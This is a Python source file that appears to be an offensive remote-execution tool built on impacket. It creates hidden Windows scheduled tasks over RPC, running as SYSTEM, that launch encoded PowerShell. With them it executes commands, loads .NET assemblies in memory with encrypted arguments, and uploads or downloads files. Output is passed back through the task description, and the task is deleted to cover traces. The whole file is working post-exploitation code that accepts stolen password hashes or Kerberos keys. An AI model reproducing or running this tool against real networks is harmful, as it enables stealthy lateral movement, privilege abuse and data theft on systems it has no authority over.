#!/usr/bin/env python
from __future__ import division
from __future__ import print_function
import string
import sys
import time
import random
import logging
import base64
import codecs
import os
from impacket.dcerpc.v5 import tsch, transport,epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, \
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64

class TSCH_EXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None, sessionId=None, codec="utf-8"):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__codec = codec
        self.__common_ps = ""
        self.sessionId = sessionId

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')
        self.get_common_ps()

    def check_file_size(self, data):
        # Check if the file size is greater than 1MB
        if len(data) > 1048576:
            logging.error('File size is too big, please consider using a smaller file')
            return False
        return True

    def get_common_ps(self):
        with open('./libs/powershells/common.ps1', 'r') as f:
            self.__common_ps = f.read()

    def play(self, addr, interface):
        if interface == "ATSVC":
            stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % addr
        else:
            try:
                stringbinding = epm.hept_map(addr, tsch.MSRPC_UUID_TSCHS, protocol="ncacn_ip_tcp")
            except Exception as e:
                logging.error("Connect error, error is {}".format(e))
                sys.exit(1)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                         self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        self.check_logon(rpctransport, interface)
        self.__rpctransport = rpctransport

    def start_tsch(self, description, script, randomkey="",tmpName="", save=False, save_path=""):
        try:
            self.doStuff(self.__rpctransport, randomkey=randomkey, tmpName=tmpName, description=description, script=script, save=save, save_path=save_path)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')

    def execute_powershell(self, command):
        with open('./libs/powershells/cmd.ps1', 'r') as f:
            script = f.read()
        self.start_tsch(command, script)

    def execute_cmd_command(self, command):
        if self.sessionId is not None:
            cmd, args = self.cmd_split(command)
        else:
            cmd = "cmd.exe"
            args = "/C %s" % (command)
        command = cmd + ' ' + args
        logging.debug('Executing cmd command: %s' % command)
        with open('./libs/powershells/cmd.ps1', 'r') as f:
            script = f.read()
        self.start_tsch(command, script)

    def execute_assembly(self, prog, args):
        with open('./libs/powershells/net.ps1', 'r') as f:
            script = f.read()

        if os.path.exists(prog) is False:
            logging.error('File %s not found!' % prog)
            return
        
        with open(prog, 'rb') as f:
            file_data = f.read()

        if self.check_file_size(file_data) is False:
            return
        key = get_random_bytes(16)
        encode_args = self.encrypt(key, args.lstrip())
        file_data = base64.b64encode(file_data).decode('utf-8')
        script = script.replace('REPLACE_ARGS', encode_args)
        self.start_tsch(file_data, script, randomkey=key)

    def upload_file(self, local, remote):
        with open('./libs/powershells/upload.ps1', 'r') as f:
            script = f.read()
        if os.path.exists(local) is False:
            logging.error('Local File %s not found!' % local)
            return
        with open(local, 'rb') as f:
            file_data = f.read()
        if self.check_file_size(file_data) is False:
            return
        # if remote is a directory, append the filename to the path
        if remote[-1] == '/' or remote[-1] == '\\':
            if "/" in local:
                remote += local.split('/')[-1]
            else:
                remote += local.split('\\')[-1]
        logging.info('Uploading %s to %s' % (local, remote))
        file_data = base64.b64encode(file_data).decode('utf-8')
        script = script.replace('REPLACE_FILE_PATH', remote)
        self.start_tsch(file_data, script)

    def download_file(self, remote, local):
        with open('./libs/powershells/download.ps1', 'r') as f:
            script = f.read()

        # if local is a directory, append the filename to the path
        if local[-1] == '/' or local[-1] == '\\':
            if "/" in remote:
                local += remote.split('/')[-1]
            else:
                local += remote.split('\\')[-1]
        logging.info('Downloading %s to %s' % (remote, local))
        script = script.replace('REPLACE_FILE_PATH', remote)
        self.start_tsch("", script, save=True, save_path=local)

    def output_callback(self,data):
        try:
            print(data.decode(self.__codec))
        except UnicodeDecodeError:
            logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                        'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute atexec.py '
                        'again with -codec and the corresponding codec')
            print(data.decode(self.__codec, errors='replace'))


    def cmd_split(self, cmdline):
        cmdline = cmdline.split(" ", 1)
        cmd = cmdline[0]
        args = cmdline[1] if len(cmdline) > 1 else ''
        return [cmd, args]
    
    def xml_escape(self, data):
        replace_table = {
                "&": "&amp;",
                '"': "&quot;",
                "'": "&apos;",
                ">": "&gt;",
                "<": "&lt;",
                }
        return ''.join(replace_table.get(c, c) for c in data)
     
    def encrypt(self, key, data):
        cipher = AES.new(key, AES.MODE_CBC)
        padded_data = pad(data.encode(), AES.block_size)
        encrypted = cipher.encrypt(padded_data)
        return base64.b64encode(cipher.iv + encrypted).decode()
    
    def decrypt(self, key, encrypted_data):
        raw = base64.b64decode(encrypted_data)
        iv = raw[:AES.block_size]
        encrypted = raw[AES.block_size:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = cipher.decrypt(encrypted)
        return unpad(padded_data, AES.block_size).decode()
    
    def check_logon(self, rpctransport, intercate):
        try:
            dce = rpctransport.get_dce_rpc()
            dce.set_credentials(*rpctransport.get_credentials())
            if self.__doKerberos is True:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(tsch.MSRPC_UUID_TSCHS)
            if intercate == "TSCH":
                as_user = f"{self.__domain}\\{self.__username}"
                logging.info(f"Connecting to DCE/RPC as {as_user}")
                tsch.hSchRpcHighestVersion(dce=dce)
            logging.info("Successfully bound.")
        except Exception as e:
            logging.error(e)
            sys.exit(1)
        dce.disconnect()
        return False
    
    def doStuff(self, rpctransport, randomkey="", tmpName="",description="", script="", save=False, save_path=""):
        dce = rpctransport.get_dce_rpc()

        dce.set_credentials(*rpctransport.get_credentials())
        if self.__doKerberos is True:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        if randomkey == "":
            randomkey = get_random_bytes(16)
        if tmpName == "":
            tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
        
        description = self.encrypt(randomkey, description)
        ps_script = script.format(key_b64=base64.b64encode(randomkey).decode('utf-8'), common_ps=self.__common_ps, taskname=tmpName) 

        # logging.debug(ps_script)
        # Encode the PowerShell script as a UTF-16LE byte string
        byte_string = codecs.encode(ps_script, 'utf-16le')
        # Base64 encode the UTF-16LE byte string
        enc = base64.b64encode(byte_string)
        # The result will be a byte string, if you need it as a string, decode it
        encoded_string = enc.decode('ascii')

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>{description}</Description>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NonInteractive -enc {ps_command}</Arguments>
    </Exec>
  </Actions>
</Task>
""".format(description=self.xml_escape(description), ps_command=self.xml_escape(encoded_string))
        taskCreated = False
        # logging.debug('task xml: %s' % xml)
        try:
            logging.debug('Creating task \\%s' % tmpName)
            if logging.getLogger().level == logging.DEBUG:
                with open('task.xml', 'w') as f:
                    f.write(xml)
            logging.debug('Task xml size: %d' % len(xml))
            tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            taskCreated = True

            logging.debug('Running task \\%s' % tmpName)

            if self.sessionId is None:
                resp = tsch.hSchRpcRun(dce, '\\%s' % tmpName)
            else:
                try:
                    resp = tsch.hSchRpcRun(dce, '\\%s' % tmpName, flags=tsch.TASK_RUN_USE_SESSION_ID, sessionId=self.sessionId)
                except Exception as e:
                    if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0 :
                        logging.info('The specified session doesn\'t exist!')
                        done = True
                    else:
                        raise
            
            # print the task guid
            guid = resp['pGuid']            
            while True:
                 # Get the task status code with SchRpcGetTaskInfoResponse
                # logging.debug('Calling SchRpcGetTaskInfoResponse for \\%s' % tmpName)
                try:
                    resp = tsch.hSchRpcGetInstanceInfo(dce, guid)
                    taskState = resp['pState']
                    if taskState == tsch.TASK_STATE_RUNNING:
                        continue
                except tsch.DCERPCSessionError as e:
                    logging.debug("Task is stopped")
                    break
                except Exception as e:
                    logging.error(e)
                    break
                time.sleep(1)
            try:
                logging.debug('Calling SchRpcRetrieveTask to get result for \\%s' % tmpName)
                resp = tsch.hSchRpcRetrieveTask(dce, '\\%s' % tmpName)
                # logging.debug('Task XML for \\%s' % tmpName)
                resp_xml = resp['pXml']
                # get the output from xml Description
                output = resp_xml.split('<Description>')[1].split('</Description>')[0]
                if output in xml:
                    logging.error('Execution failed, no output returned or the ps killed by AV.')
                else:
                    if save is True:
                        try:
                            output = base64.b64decode(output)
                            with open(save_path, 'wb') as f:
                                f.write(output)
                        except Exception as e:
                            self.output_callback(output.encode(self.__codec))
                    else:
                        output = self.decrypt(randomkey, output)
                        self.output_callback(output.encode(self.__codec))
            except Exception as e:
                logging.error(e)

            logging.debug('Deleting task \\%s' % tmpName)
            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
            taskCreated = False
        except tsch.DCERPCSessionError as e:
            logging.error(e)
            e.get_packet().dump()
        finally:
            if taskCreated is True:
                tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

        if self.sessionId is not None:
            dce.disconnect()
            return
        
        dce.disconnect()